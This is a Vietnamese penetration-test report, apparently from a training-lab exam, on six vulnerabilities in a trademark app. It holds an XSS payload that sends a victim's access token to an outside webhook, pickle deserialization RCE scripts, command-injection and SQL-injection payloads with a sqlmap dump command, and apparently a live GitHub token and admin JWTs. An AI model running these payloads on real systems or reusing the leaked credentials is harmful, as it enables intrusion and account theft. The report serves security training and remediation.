# BÁO CÁO LỖ HỔNG BẢO MẬT

*author: Trần Phạm Hải Dương-sp4rkl3*

*email: duongtran1806ap@gmail.com*

# Tổng quan

Đây là báo cáo lỗ hổng về ứng dụng **IPKage** được sử dụng để đăng kí bản quyền nhãn hiệu

Các đường dẫn được sử dụng trong đợt Pentest này: 

Main server:

- `https://ipkage.exam.cyberjutsu-lab.tech/`

 Bot editor:

- `https://ipkage.victim.cyberjutsu-lab.tech/`

### Phạm vi:

Quá trình kiểm thử được thực hiện trong môi trường Cyberjutsy Academy cung cấp, không gây ảnh hưởng đến hệ thống thực tế. Được thực hiện dưới hình thức **kiểm thử Blackbox**. Mục tiêu là xác định các lỗ hổng bảo mật tiềm ẩn có thể bị khai thác bởi các tác nhân độc hại từ bên ngoài.

### Tổng quan lỗ hổng:

Trong quá trình kiểm thử đã phát hiện ra 5 lỗ hổng:

- Xem được notification của những user khác  (**IDOR)**
- Leak nội dung của các file hệ thống như `/etc/passwd` và thông qua đó leak được source code của ứng dụng  (**Path Travesals)**
- Đánh cắp `access_token` của những user khác và truy cập được tài khoải của họ với đầy đủ chức năng của `role` được cấp cho tài khoản đó  (**XSS)**
- Thực hiện các biện pháp có thể leak được nội dung bên trong **Database**, từ đó có thể lợi dụng và leo lên quyền chiếm dụng những tài khoản có quyền **admin (SQL Injection)**
- Thực thi mã độc RCE thông qua chức năng upload và resore cache giới hạn trong tải khoản **admin**  (**Python Deserialize)**
- Thực thi được RCE thông qua chức năng backup trademarks xuất hiện trong tài khoản **admin** (**OS Command Injection**)

---

# BUG 1: IDOR

### 1. Mô tả và tác động

Tại endpoint `/api/notification/{user_id}/{notification_id}` tôi thấy rằng nó không có bất kì một sự kiểm tra quyền truy cập nào, miễn là `user_id` đó sở hữu `notification_id` đó là ta sẽ coi được nội dung của notification đó bấy kể quyền truy cập của ta là gì.  Điều này ảnh hương lớn đến tính bảo mật của thông tin cá nhân của user

**Severity: CVSS 3.1 Base Score = 7.5 (High)**

### 2. Root-Cause

Tại file `/backend/app/routers/notification.py` đoạn code từ dòng 31 đã gây ra lỗi này, `user_id` và `noticication_id` đã lấy trực tiếp dữ liệu được truyền vào từ người dùng để truy xuất notifcation mà không có bất kì sự kiểm tra quyền truy cập nào. Từ đó attacker có thể xem bất cứ notification nào hắn ta muốn

![image.png](image.png)

### 3. Tiến hành khai thác

Tôi tạo 2 user có id lần lượt là `12` và `160` sau đó thử truy cập vào `https://ipkage.exam.cyberjutsu-lab.tech/api/notifications/160/197` với tư cách là `user_id=12` và xác nhận thành công

![Screenshot 2025-12-05 234119.png](Screenshot_2025-12-05_234119.png)

Sau đó tôi tạo code python để brute force `user_id` và `notification_id` và đã tìm được notification chứa flag, thấy rằng đó là `notification_id=10` và người sở hữu nó là `user_id=7` 

Ta thu được flag **CBJS{d3ce928da4f1eaa34a76a2cf5ccea5a1}**

![Screenshot 2025-12-05 233619.png](Screenshot_2025-12-05_233619.png)

Code được sử dụng trong bug này:

- *find_notification.py*

### 4. Khuyến nghị khắc phục

- Thay vì nhận `user_id` từ người dùng, ta nên sử dụng `access_token` để kiếm soát quyền truy cập

```jsx
@router.get("/{notification_id}", response_model=Notification)
async def get_user_notification_by_id(
    notification_id: int,
    current_user: User = Depends(get_current_user),
    db: Session = Depends(get_db)
):
    notification = notification_crud.get_user_notifications_by_id(
        db,
        user_id=current_user.id,
        notification_id=notification_id
    )
```

- Nếu vẫn muốn dùng `user_id` từ người dùng thì ta nên có thêm đoạn code kiểm tra quyền truy cập

```jsx
if user_id != current_user.id:
    raise HTTPException(403, "Forbidden")

```

---

# BUG 2: Path Traversal

### 1. Mô tả và tác động

Tại endpoint `/api/{trademark_id}/document/view?file=`  ta có thể truyền vào parameter file đường đẫn *absolute path* của một file cụ thể trong hệ thống và server cho phép ta đọc toàn bộ file đó. Từ đó những file nhạy cảm như `/etc/passwd` hay là `/app/config.py` có thể bị đọc toàn bộ dẫn đến tiết lộ hoàn toàn source code của ứng dụng.

**Severity: CVSS 3.1 Base Score = 7.5 (High)**

### 2. Root-Cause

Tại file `/backend/app/routers/notification.py` dòng *199* đọc file path do client gửi lên thông qua query param `?file=` và ghép nó vào đường dẫn tài liệu tương ứng với `trademark_id` . Tuy nhiên ở đây không có bất kì một feature nào được sử dụng để kiểm soát đầu vào của input dẫn đến việc bất kì file nào cũng có thể được đọc, và cuối cùng dòng *204* sẽ in ra toàn bộ nội dung của đường dẫn lên cho người dung có thể đọc

![image.png](image%201.png)

### 3. Tiến hành khai thác

Trước tiên, thử truy cập vào 

**`https://ipkage.exam.cyberjutsu-lab.tech/api/trademarks/69/documents`**  và thấy những file của documents này, thấy rằng quả thực ứng dụng web này sử dụng query param `?file=` để đọc file

![image.png](image%202.png)

Sau đó trực tiếp sử dụng burp để truy cập vào `/etc/passwd` để xem file và kiếm chứng giả thuyết và đã thấy được file 

![Screenshot 2025-12-06 005844.png](Screenshot_2025-12-06_005844.png)

Tại đây ta thu được flag **CBJS{33c38a0713f95a7112369fb41846d260}** 

Tiện thể ta tiếp tục truy cập vào file `/app/config.py` để tìm source code và ta đã thu được kết quả

![Screenshot 2025-12-06 005937.png](Screenshot_2025-12-06_005937.png)

Sau khi có được `github_pat` ta tiếp tục sử dụng chúng để kéo source về máy và đã thành công lấy được source 

```jsx
curl -H "Authorization: token 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" \
     https://api.github.com/repos/sillymeomeo/ipkage/zipball/main \
     -L -o source.zip
```

![Screenshot 2025-12-06 010243.png](Screenshot_2025-12-06_010243.png)

### 4. Khuyến nghị khắc phục

- Chỉ cho phép đọc file ở trong 1 thư mục duy nhất , ví dụ : `/var/www/uploads/trademark/<id>/`
- Validate Extension của file trước khi đọc, ví dụ:  chỉ đọc các file có đuôi `pdf`, `jpg`, `docx`
- Không dùng substring check`if "env" in str(file_path)"`

---

# BUG 3: XSS

### 1. Mô tả và tác động

Tại chức năng `/profile/create-report` ta có thể chèn vào ta `<img` ở phần *content* của report đươc tạo. Khi tạo ra không có gì xày ra vì user bình thường khi tạo xong report thì không có quyền tác động khác như sửa hay xóa nên hoàn toàn vô hại. Nhưng nêu report đó được bởi một account khác có quyền tác động lên report thì sẽ xảy ra lỗi **XSS**. Lỗi này có thể khiến attacker lấy trộm được `access_token` của user khác và từ đó chiềm quyền truy cập vào account đó. 

**Severity: CVSS 3.1 Base Score = 9.6 (Critical)**

### 2. Root-Cause

Tại file `/frondend/app/editor/reports/page.tsx` dòng 208 tồn tại nội dung nguy hiểm là hàm `dangerouslySetInnerHTML={{ __html: report.content }}` tại đây anh dev sử dụng hàm này để render HTML đúng định dạng ấy vậy nhưng anh dev lại quên không sanitize lại input của người dùng nên đã sinh ra lỗi 

![Screenshot 2025-12-06 230444.png](Screenshot_2025-12-06_230444.png)

### 3. Tiến hành khai thác

Tại chức năng `/profile/create-report` ta tạo một tag `<img` và chèn vào webhook để kiếm tra xem **XSS** có xảy ra không

![image.png](image%203.png)

Sau khi tạo ra xong, ta thấy `id` của report này là 91, ta gửi cho  Bot editor có url là : [`https://ipkage.victim.cyberjutsu-lab.tech/`](https://ipkage.victim.cyberjutsu-lab.tech/) nội dung là [`https://ipkage.exam.cyberjutsu-lab.tech/editor/reports/91`](https://ipkage.exam.cyberjutsu-lab.tech/editor/reports/91) để bot có thể sử dụng đúng chức năng của nó và mở report lên, và ta đã thấy request được gửi về

![image.png](image%204.png)

Tiếp đó tiếp tục tạo ra một report mới với mục đích lần này là bot sẽ gửi về cho ta `access_token` của nó

```jsx
 <img src=x onerror="
(async () => {
  try {
    const t = localStorage.getItem('access_token');
    await fetch('https://webhook.site/1c3c3cf7-5e0a-419b-9863-03054d277019?token=' + t);

    const r = await fetch('/api/editor/dashboard', {
      headers: { 'Authorization': 'Bearer ' + t }
    });
    const d = await r.text();

    await fetch('https://webhook.site/1c3c3cf7-5e0a-419b-9863-03054d277019', {
      method: 'POST',
      body: d
    });
  } catch(e){}
})();
">
```

Sau khi tạo xong ta thấy report `id` là 92, tiếp tục gửi cho bot [`https://ipkage.exam.cyberjutsu-lab.tech/editor/reports/92`](https://ipkage.exam.cyberjutsu-lab.tech/editor/reports/92) và đã nhận về được token của bot với chức năng editor 

![image.png](image%205.png)

Ta sử dụng `access_token` đó và truy cập vào endpoint `/api/auth/secret` và đã lấy được flag 

![Screenshot 2025-12-06 230802.png](Screenshot_2025-12-06_230802.png)

Ta thu về được flag **CBJS{2bf23460dafa5ed206bb01eda6a4429f}**

### 4. Khuyến nghị khắc phục

- Sanitize nội dung report của người dùng trước khi render
- Nếu cho phép sử dụng markdown, hãy tạo một withlist nghiêm ngặt để kiếm soát những hàm nguy hiểm
- Thay đổi toàn bộ flow: lưu content dạng Markdown thay vì HTML

---

# BUG 4: SQL Injection

### 1. Mô tả và tác động

Tại endpoint `/search?query=` thực hiện truy vấn SQL để search **Trademarks.** Attacker có thể lợi dụng hành vi này và inject câu truy vấn SQL để thực hiện hành vi trích xuất dữ liệu từ database. Lỗi này khiến các thông tin nhạy của user có thể sẽ bị đánh cắp, gây thiệt hại tới uy tín, độ bảo mất thông tin cá nhân của doanh nghiệp, ngoài ra attacker cũng có thể thực hiện hành vì leo thang lên các tài khoản admin thông qua những thông tin bị leak và có thể thực hiện các chức năng được limit

**Severity: CVSS 3.1 Base Score = 10.0 (Critical)**

### 2. Root-Cause

Nguyên nhân xảy ra lỗi này bởi vì tại file `/backend/app/crud/trademark.py` tại dòng số 36, biến `query` được truyền trực tiếp vào câu truy vấn nhưng lại không có bất kì biện phát filter nào.  Từ đó Attacker được toàn quyền inject và dump ra database của hệ thống

![image.png](image%206.png)

### 3. Tiến hành khai thác

Dựa vào đoạn code xảy ra bug, ta thực hiện kiểm tra syntax với payload `%') OR 1=1-- -` và xác nhận rằng đây chính là syntax cần để thực hiện truy vấn 

![Screenshot 2025-12-06 090659.png](Screenshot_2025-12-06_090659.png)

Sau đó thực hiện blind SQL Injection với đoạn code python *sqli.py*  và ta đã brute force ra được flag nằm ở trong `collaborations.workspace_content`

![Screenshot 2025-12-06 094814.png](Screenshot_2025-12-06_094814.png)

Ta thu được flag ở đây là **CBJS{52620d6e50e4e86013e9d2a3d5a353b6}**

Tiếp túc tiến hành khai thác, ta thấy rằng chức năng  `/api/auth/forgot-password` không cần bất kì `token` nào để có thể thưc thi, vì vậy ta có thể lợi dụng điều này để chiếm quyền của tài khoản admin. 

![image.png](image%207.png)

Tại file `/backend/app/crud/otp.py` ta thấy được đoạn code có chức năng generate ra otp code khi thực hiện chức năng `forgot-password` và otp-code được gen ra sẽ được mã hóa `md5` và lưu vào trong database

![image.png](image%208.png)

Vậy bây giờ chỉ cần có được email admin là ta có thể thực hiện hành động resest password của admin, ta chạy đoạn code **dumpadmin.py** sử dụng SQLI để brute force ra email admin ở trong database và thu được kết quả

![image.png](image%209.png)

Từ những email này tha thực hiện đổi password admin, trước tiên ta chọn mail [*admin_3@gmail.com*](mailto:admin_3@gmail.com) để thực hiện forgot-password 

![image.png](image%2010.png)

Ngay sau khi thực hiện thao tác này, ta chạy sqldump để dump ra dữ liệu otp vừa được tạo và ta đã thu về được hash `287e5a68ad6a1055a008f126572e71da` payloadsqldump: 

```jsx
sqlmap -u "https://ipkage.exam.cyberjutsu-lab.tech/api/trademarks?query=a" \
  --headers="Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkdW9uZ0BnbWFpbC5jb20iLCJyb2xlIjoiY2xpZW50IiwiZXhwIjoxNzY1MTE0ODc4fQ.Xo7uav6e4GcWE_8AT-d72Peob1dUoKEj-RcorjCy8tI" \
  -D public -T otp_codes -C otp_code,email \
  --dump --threads=10 --batch --technique=B --fresh-queries
```

![27865044-6534-4b34-b3e2-d40ce66385c7.jpg](27865044-6534-4b34-b3e2-d40ce66385c7.jpg)

Sau đó ta sử dụng Crastation để decrypt otp_code và thu về được là `835564`

![Screenshot 2025-12-07 013517.png](Screenshot_2025-12-07_013517.png)

Sau đó sử dụng mã code này để đổi password thành `12345678`

![Screenshot 2025-12-07 013438.png](Screenshot_2025-12-07_013438.png)

Sử dụng email và password vừa được reset đó và ta đã chiếm được tài khoản admin

![Screenshot 2025-12-07 013658.png](Screenshot_2025-12-07_013658.png)

Code được sử dụng trong bug này:

- *dumpadmin.py*
- *sqli.py*

### 4. Khuyến nghĩ khắc phục

- Sử dụng Prepared Statements / Parameterized Queries thay vì truyền trực tiếp biến truy vấn vào câu truy vấn
- Validate & Sanitize input
- Dùng Elasticsearch hoặc PostgreSQL full text search
- Bắt buộc xác thực OTP dựa trên token tạm thời
- OTP không được lưu ở dạng MD5 sử dụng những kiểu hash khác, ví dụ: brypt, Argo2, SHA-256 với salt
- Mỗi lần request OTP phải rate-limit

---

# BUG 5: **RCE via** Python Deserialize

### 1. Mô tả và tác động

Tại tài khoản admin khi xem *trademarks* có thể upload và restore file cache, tuy nhiên những chức năng này được hàm `pickle` xử lý của python. Attacker có thể lợi dụng điều này để thực hiện lỗi Python Deserialize và thực hiện RCE đến server. Lỗi này gây ra hậu quả cực kì nghiêm trọng vì attacker có thể thực thị RCE thành công và có quyền hạn rất lớn với server.

**Severity: CVSS 3.1 Base Score = 10.0 (Critical)**

### 2. Root-Cause

Tại file `/backend/app/serviecs/document_serviecs.py` ta có thể thấy được hàm `pickle.load()` ở dòng 56 sẽ load file `.pkl` lên server một cách trực tiếp, và file này hoàn toàn có thể upload lên bởi người dung. Điều này khiến cho đây chở thành đoạn code chí mạng với server này

![image.png](image%2011.png)

### 3. Tiến hành khai thác

Trước tiên tạo 1 đoạn code python có tên [*rce.py*](http://rce.py)  với hàm eval rằng sẽ thự thi câu lệnh tương đương với `ls /` 

```jsx
import pickle

class Exploit:
    def __reduce__(self):
        return (eval, ("str(__import__('os').listdir('/'))",))

with open("exploit.pkl", "wb") as f:
    pickle.dump({'data': Exploit()}, f)
```

Sau khi chạy đoạn code, file `exploite.pkl` được dump ra, ta sử dụng pay load để upload file `exploit.pkl` lên server

```jsx
curl -X POST "https://ipkage.exam.cyberjutsu-lab.tech/api/trademarks/9/cache/upload"   -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbl8zQGlwa2FnZS52biIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc2NTEzMjQ4OX0.-WW_CdkBzI0-FBdEyXjjpEJ8NpQa03jH7ED6bX1ds1o"   -F "cache_file=@exploit.pkl"
```

Sau đó ta thực hiện chức năng restore với payload 

```jsx
┌──(sw㉿sparklingwaves)-[/mnt/c/Users/ADMIN/Music/CBJS/sillymeomeo-ipkage-96d715783ce55c8f33d8947b5ada8edd10d389e9]
└─$ curl -X POST "https://ipkage.exam.cyberjutsu-lab.tech/api/trademarks/9/cache/restore"   -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbl8zQGlwa2FnZS52biIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc2NTEzMjQ4OX0.-WW_CdkBzI0-FBdEyXjjpEJ8NpQa03jH7ED6bX1ds1o"
```

Và ta đã thu được các file có trong thư mục `/` 

![Screenshot 2025-12-07 172647.png](Screenshot_2025-12-07_172647.png)

Ta có được file flag là `flag_5e6b4b0d.txt`  sau đó ta tạo thêm 1 file code [*rce2.py*](http://rce2.py) để tiếp tục khai thác flag

```jsx
import pickle

class Exploit:
    def __reduce__(self):
        return (eval, ("open('/flag_5e6b4b0d.txt').read()",))

with open("exploit2.pkl", "wb") as f:
    pickle.dump({'data': Exploit()}, f)
```

Sau đó tương tự ta upload file `exploite2.pkl` và restore nó ta đã thu được flag

```jsx
curl -X POST "https://ipkage.exam.cyberjutsu-lab.tech/api/trademarks/9/cache/upload"   -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbl8zQGlwa2FnZS52biIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc2NTEzMjQ4OX0.-WW_CdkBzI0-FBdEyXjjpEJ8NpQa03jH7ED6bX1ds1o"   -F "cache_file=@exploit2.pkl" 
```

```jsx
curl -X POST "https://ipkage.exam.cyberjutsu-lab.tech/api/trademarks/9/cache/restore"   -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJhZG1pbl8zQGlwa2FnZS52biIsInJvbGUiOiJhZG1pbiIsImV4cCI6MTc2NTEzMjQ4OX0.-WW_CdkBzI0-FBdEyXjjpEJ8NpQa03jH7ED6bX1ds1o"
```

![Screenshot 2025-12-07 172819.png](Screenshot_2025-12-07_172819.png)

Flag ta thu được ở đây là **CBJS{09a19d9c5d31e902454443535813ad8d}**

Code được sử dụng trong bug này:

- *rce.py*
- *rce2.py*

### 4. Khuyến nghị khắc phục

- Không bao giờ dùng `pickle.load()` với dữ liệu từ user
- **Mã hóa và xác thực dữ liệu cache** bằng chữ ký số (HMAC) để đảm bảo **chỉ dữ liệu do server tạo mới được nạp**
- Không tin tưởng bất kỳ file nào được upload bởi người dùng.

---

# BUG 6: RCE via Command Injection

### 1. Mô tả và tác động

Tại chức năng `/api/admin/backup-trademarks?backup_name=` sử dựng query param `?backup_name=` để thực hiện truyền vào tên file mà ta muốn backup tuy nhiên ở đây lại không thông qua bất kì filter nào dẫn đến việc user có thể truyền vào bất kì họ muốn. Lỗi này gây là hệ quả nghiêm trọng , có thể dẫn đến RCE và ảnh hương lớn đến server 

**Severity: CVSS 3.1 Base Score = 9.1 (Critical)**

### 2. Root-cause

Tại file `backend/app/routers/admin.py` ta thấy rằng file backup với tên file được truyền vào sễ được zip lại thông qua câu lệnh `os.path.join` và sẽ file sẽ được lưu ở thư mục `/tmp` ở dòng 222 ,tuy nhiên tên file là thứ được truyền vào từ user và không được filter do đó đoạn code này đã xảy ra lỗi **Comand Injection**

![Screenshot 2025-12-07 182418.png](Screenshot_2025-12-07_182418.png)

### 3. Tiến hành khai thác

Để kiểm chứng nghi ngờ ta thự hiện payload `?backup_name=a%3bsleep+5%3b%23` để kiểm tra và thấy rằng server đã bị delay 5 giây, nó đã tốn hơn 6 giây để phàn hổi trong khi bình thường chỉ có hơn 1 giây

![Screenshot 2025-12-07 183614.png](Screenshot_2025-12-07_183614.png)

![Screenshot 2025-12-07 183908.png](Screenshot_2025-12-07_183908.png)

Sau khi xác nhận ra tiến hành khai thác sử dụng payload `a%3bcat%20/flag_5e6b4b0d.txt%20%3E%20/tmp/SRC_with_love.txt%3b%23` để ghi nội dung của file flag vào file `/tmp/SRC_with_love.txt`

![image.png](image%2012.png)

Sau đó lợi dụng chức năng **Path Travesal** ở `/api/trademarks/9/documents/view?file=` để đọc file và ta đã khai thác được thành công 

![image.png](image%2013.png)

### 4. Khuyến nghị khắc phục

- **Thay thế `os.system()` bằng `subprocess.run()` với `shell=False`**
- Xác thực `backup_name` chỉ chứa ký tự an toàn

---

# Kết luận

Qua quá trình kiểm thử hệ thống, tôi đã phát hiện các lỗ hổng bảo mật nghiêm trọng có thể bị khai thác để truy cập trái phép dữ liệu, thực thi mã độc hoặc giả mạo người dùng. Nếu không được khắc phục kịp thời, các lỗ hổng này có thể ảnh hưởng lớn đến tính bảo mật và an toàn của hệ thống. Đề nghị đơn vị vận hành sớm khắc phục các điểm yếu đã phát hiện, đồng thời chủ động rà soát các tính năng xử lý tương tự để phát hiện và vá các lỗ hổng tiềm ẩn. Bên cạnh đó, cần tăng cường kiểm soát đầu vào, xác thực và phân quyền để hạn chế rủi ro bảo mật trong tương lai.

**Trân trọng @sp4rkl3**